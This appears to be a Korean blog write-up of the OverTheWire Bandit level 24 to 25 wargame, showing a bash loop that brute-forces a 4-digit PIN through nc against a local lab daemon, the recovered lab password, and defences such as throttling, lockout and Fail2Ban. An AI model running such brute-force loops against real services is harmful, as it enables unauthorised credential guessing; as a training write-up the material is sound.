---
layout: post
title: "[Bandit] Level 24 → Level 25"
date: 2025-07-05 09:05:00 +0900
categories: [bandit]
tags: [overthewire, bandit, linux, brute-force, shell-script, fail2ban]
---

## 1. 문제 개요

> **Level Goal**
> 
> A daemon is listening on port 30002 and will give you the password for bandit25 if you send it the password for bandit24 and a **4 digit numeric PIN code**.

서버 포트(30002)에 `[현재비번] [PIN]` 형식으로 메시지를 보내야 합니다. PIN 코드는 4자리 숫자(0000~9999)입니다. 1만 가지 경우의 수를 일일이 쳐볼 수는 없으니, 스크립트를 짜서 자동으로 대입하는 **Brute-Force(무차별 대입) 공격**을 수행해야 했습니다.

---

## 2. 사용 명령어

| 명령어 | 설명 |
|--------|------|
| `for i in {0000..9999}` | 0000부터 9999까지 4자리 숫자를 순서대로 생성하는 쉘 반복문 |
| `grep -v "Wrong"` | "Wrong"이라는 단어가 **포함되지 않은** 줄만 출력 (성공한 줄만 보기 위해) |

---

## 3. 풀이 과정

`bandit24` 계정으로 로그인합니다.

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

1. **테스트 접속**: 먼저 `nc`로 접속해서 어떤 식으로 입력을 요구하는지 확인합니다.

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for bandit24 and the secret pincode on a single line, separated by a space.
```
`[현재비번] [PIN]` 형식으로 입력하라고 합니다. 임의의 값을 입력해 봅니다.
```
D2J41fb8mpcr9hjsf32ECf2d012eK2g9 1234
Wrong! Please enter the correct pincode. Try again.
```
틀리면 "Wrong!"이 뜹니다.

### 2. 브루트 포스 스크립트 작성
일일이 칠 수 없으니 스크립트를 짭니다. `for`문과 `{0000..9999}` 확장 기능을 사용하면 한 줄로 가능합니다.

```bash
#!/bin/bash
PASS="D2J41fb8mpcr9hjsf32ECf2d012eK2g9"

for i in {0000..9999}
do
    echo "$PASS $i"
done
```
위 코드는 1만 줄의 공격 문자열을 생성합니다.

### 3. 공격 실행
스크립트의 출력을 `nc` 명령어로 파이프(`|`)를 통해 넘겨줍니다. `nc`는 30002 포트로 접속해서 우리가 만든 10,000개의 조합을 순석대로 전송합니다.

생성된 1만 줄을 `nc`로 한방에 보냅니다. 한 줄씩 접속(`nc`)하는 것보다, 한 번 연결된 상태에서 계속 쏘아붓는 게 훨씬 빠릅니다.

```bash
# for문을 한 줄(One-liner)로 작성해서 실행
bandit24@bandit:~$ for i in {0000..9999}; do echo "D2J41fb8mpcr9hjsf32ECf2d012eK2g9 $i"; done | nc localhost 30002 > /tmp/result.txt
```
결과가 너무 많으므로(1만 줄의 "Wrong!"), 일단 파일로 저장했습니다.

### 4. 결과 확인
성공한 케이스("Correct" 혹은 비번)를 찾습니다.

```bash
bandit24@bandit:~$ cat /tmp/result.txt | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is pOhf1B4V482m1D5OPs2f42a5M7i42oSb
```
"Wrong"을 제외(`grep -v`)하니 정답이 보입니다!

---

## 4. 결과

<details markdown="1">
<summary>비밀번호 확인</summary>

```
pOhf1B4V482m1D5OPs2f42a5M7i42oSb
```

</details>

---

## 5. 배운 점

1. **Brute-Force 공격**: 가능한 모든 경우의 수를 시도하는 가장 무식하지만 확실한 해킹 기법입니다.
2. **Bash Range Expansion**: `{0000..9999}` 문법을 사용하면 0으로 채워진(Zero-padding) 숫자 시퀀스를 쉽게 만들 수 있습니다.

---

## 6. 보안 관점

- **현실적인 방어 기법**:
    1. **Throttling (속도 제한)**: 1초에 1번 이상 시도를 못하게 하거나, 틀릴 때마다 응답 대기 시간을 2배씩 늘립니다. (1만 번 시도하는 데 며칠이 걸리게 만듬)
    2. **Account Lockout (계정 잠금)**: 5회 이상 틀리면 계정을 30분간 잠그거나 관리자가 풀어줄 때까지 차단합니다.
    3. **Fail2Ban**: 서버 로그를 감시하다가 특정 IP에서 반복적인 실패가 발생하면 방화벽으로 차단해버리는 오픈소스 도구입니다.

<hr class="short-rule">